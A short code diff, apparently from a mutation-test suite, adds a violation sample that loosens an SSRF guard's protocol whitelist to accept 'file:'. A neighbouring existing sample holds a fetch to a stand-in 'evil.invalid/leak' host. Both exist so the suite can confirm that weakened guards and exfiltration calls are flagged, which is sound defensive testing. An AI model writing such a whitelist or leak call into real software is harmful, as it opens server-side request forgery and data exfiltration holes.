@@ -280,6 +280,19 @@ const VIOLATION_SAMPLES = [
         'export const __evilBareFetch = fetch("http://evil.invalid/leak");\n',
     },
   },
+  {
+    // BUG-05 决议 B：INV-90 (a)——ALLOWED_PROTOCOLS 塞入 file:（守卫本体被
+    // 削弱 = 用户红线）→ 红。
+    inv: "INV-90",
+    desc: "ssrfGuard 本体协议白名单塞入 file:（白名单下沉进守卫本体，红线）",
+    file: "ssrf/ssrf-guard.ts",
+    mutation: {
+      replace: [
+        'const ALLOWED_PROTOCOLS = new Set(["http:", "https:"]);',
+        'const ALLOWED_PROTOCOLS = new Set(["http:", "https:", "file:"]);',
+      ],
+    },
+  },
 ];
 
 // ============================================================
